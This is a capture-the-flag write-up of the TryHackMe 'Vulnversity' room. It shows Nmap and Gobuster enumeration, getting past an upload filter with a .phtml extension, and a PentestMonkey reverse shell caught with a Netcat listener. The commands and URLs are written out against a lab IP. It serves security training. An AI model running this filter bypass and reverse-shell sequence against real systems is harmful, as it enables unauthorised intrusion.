Vulnversity

Platform: TryHackMe Difficulty: Easy Date completed: 9 August 2026 Tags: Web, File Upload, Reverse Shell, Enumeration

Overview

Vulnversity is a beginner room focused on enumerating a web server, discovering a hidden file upload page, bypassing its extension filter, and using that access to get a reverse shell on the target machine.

Reconnaissance

Started with an Nmap scan to see what services were running on the target:

nmap -sC -sV 10.130.189.94

This showed a web server running on port 3333, which became the main point of focus since it was the service with the most attack surface to explore.

Enumeration

Ran Gobuster against the web server to find hidden directories that weren't linked anywhere on the visible site:

gobuster dir -u http://10.130.189.94:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt

This uncovered a directory called /internal, which led to a file upload form not accessible from the normal site navigation.

Exploitation

The upload form filtered out obviously dangerous file types like .php. To find an extension that would slip past the filter, I built a small wordlist of common PHP variants:

printf "php\nphp3\nphp4\nphp5\nphtml\n" > extensions.txt

Testing showed .phtml was accepted by the filter while still being executed as PHP by the server.

Downloaded the PentestMonkey PHP reverse shell, edited the IP and port inside the script to point back to my own machine, then renamed the file to use the working extension:

mv shell.php shell.phtml

Started a Netcat listener on the matching port:

nc -lvnp 1234

Uploaded shell.phtml through the upload form, then browsed directly to the file's location on the server to trigger it:

http://10.130.189.94:3333/internal/uploads/shell.phtml

The target connected back to the Netcat listener, giving a working shell on the box.

Lessons Learned
Wordlist file paths need to be exact — small typos in filenames or folder names are a common source of "not found" errors with tools like Gobuster.
Upload filters that block one extension often miss close variants (.phtml, .php5), which is exactly what this room demonstrates.
Reverse shells rely on the target initiating a connection back to the attacker, so the listener has to be running and the IP/port in the shell script has to match exactly.
On TryHackMe's AttackBox, the attacker machine's own IP (shown at the top of the room) is what should be used in reverse shell scripts, rather than trying to find a local VPN tunnel interface.
